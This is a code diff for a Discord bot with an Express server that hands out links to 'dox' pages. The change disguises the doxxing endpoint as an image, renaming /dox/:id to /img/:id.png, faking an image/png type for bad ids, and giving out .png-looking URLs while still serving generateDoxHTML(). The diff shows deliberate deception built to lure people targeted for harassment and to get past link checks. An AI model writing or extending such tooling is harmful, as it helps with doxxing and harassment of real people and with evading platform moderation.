@@ -19,15 +19,19 @@ const client = new Client({
 // ---- STORE ACTIVE LINKS ----
 const links = new Map();
 
-// ---- EXPRESS SERVER (for dox pages) ----
-app.get('/dox/:id', (req, res) => {
+// ---- EXPRESS SERVER (disguised as image endpoint) ----
+app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
-    if (!links.has(id)) return res.status(404).send('Link expired or invalid.');
+    if (!links.has(id)) {
+        res.type('image/png');
+        return res.send('Image not found');
+    }
+    res.type('text/html');
     res.send(generateDoxHTML());
 });
 
 app.listen(PORT, () => {
-    console.log(`🌐 Dox server running on port ${PORT}`);
+    console.log(`🌐 Server running on port ${PORT}`);
 });
 
 // ---- DISCORD BOT ----
@@ -48,7 +52,7 @@ client.on('interactionCreate', async (interaction) => {
         await interaction.deferReply({ ephemeral: true });
 
         const id = crypto.randomBytes(6).toString('hex');
-        const url = `https://pulsebot.onrender.com/dox/${id}`;
+        const url = `https://pulsebot.onrender.com/img/${id}.png`;
 
         links.set(id, {
             created: Date.now(),
